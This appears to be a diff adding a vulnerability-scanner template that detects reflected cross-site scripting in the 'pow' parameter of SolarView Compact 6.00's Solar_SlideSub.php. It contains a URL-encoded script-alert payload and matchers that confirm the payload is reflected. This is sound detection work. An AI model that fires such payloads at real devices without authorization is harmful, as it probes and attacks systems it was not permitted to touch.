@@ -1,0 +1,34 @@
+id: "solarview-compact-pow-xss"
+name: "SolarView Compact 6.00 - 'pow' Cross-Site Scripting"
+severity: "high"
+description: "SolarView Compact version 6.00 contains a cross-site scripting vulnerability in the 'pow' parameter to Solar_SlideSub.php."
+tech:
+  - "php"
+tags:
+  - "xss"
+  - "solarview"
+  - "edb"
+  - "vuln"
+reference: "https://www.exploit-db.com/exploits/50968"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "<script>alert(document.domain)</script><\"\">"
+      - "SolarView"
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
